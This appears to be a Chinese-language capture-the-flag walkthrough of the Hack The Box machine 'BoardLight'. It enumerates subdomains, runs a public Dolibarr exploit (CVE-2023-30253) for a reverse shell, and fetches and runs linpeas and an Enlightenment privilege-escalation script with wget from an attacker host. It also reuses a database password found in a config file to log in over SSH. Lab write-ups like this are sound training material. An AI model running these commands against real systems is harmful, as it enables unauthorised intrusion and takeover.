# BoardLight



端口扫描

![image-20240730151754749](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730151754749.png)

只开了80，22端口

网站首页发现域名board.htb

![image-20240730151723918](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730151723918.png)

添加到/etc/hosts文件

![image-20240730152038550](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730152038550.png)

子域名枚举

```
ffuf -u http://board.htb/ -w /home/kali/Desktop/pass/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 15949,0 -t 128 -H "HOST: FUZZ.board.htb"
```

![image-20240730154645586](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730154645586.png)

添加到/etc/hosts文件

![image-20240730154731030](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730154731030.png)

访问http://crm.board.htb

![image-20240730154849807](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730154849807.png)

![image-20240730155023093](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730155023093.png)

poc(https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

admin/admin尝试登录

![image-20240730155939768](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730155939768.png)

运行poc

```
python exploit.py http://crm.board.htb admin admin 10.10.16.23 1223
```



![image-20240730160246691](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730160246691.png)

![image-20240730160305959](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730160305959.png)

在/etc/passwd文件下找到一个可登录用户

![image-20240730161934041](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730161934041.png)

开启虚拟终端

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

上传linpeas.sh

```
wget http://10.10.16.23:9090/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

![image-20240730161008978](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730161008978.png)

![image-20240730161045876](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730161045876.png)

找到一个目录

![image-20240730162050339](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730162050339.png)



![image-20240730164141623](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164141623.png)



在/var/www/html/crm.board.htb/htdocs/conf/conf.php下找到一个用户和密码

```
dolibarrowner/serverfun2$2023!!
```

![image-20240730164111158](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164111158.png)



尝试ssh登录

![image-20240730164537108](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164537108.png)



登录失败，换个用户名

```
larissa/serverfun2$2023!!
```

![image-20240730164638833](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164638833.png)



sudo -l查看可执行的命令

![image-20240730164706984](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164706984.png)



上传linpeas.sh

![image-20240730164822859](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730164822859.png)

运行linpeas.sh

![image-20240730165027853](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730165027853.png)

Enlightenment可以提权https://www.exploit-db.com/exploits/51180

上传poc到靶机

```
wget http://10.10.16.23:9090/exploit.sh
chmod +x expoit.sh
./exploit.sh
```

![image-20240730170730091](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240730170730091.png)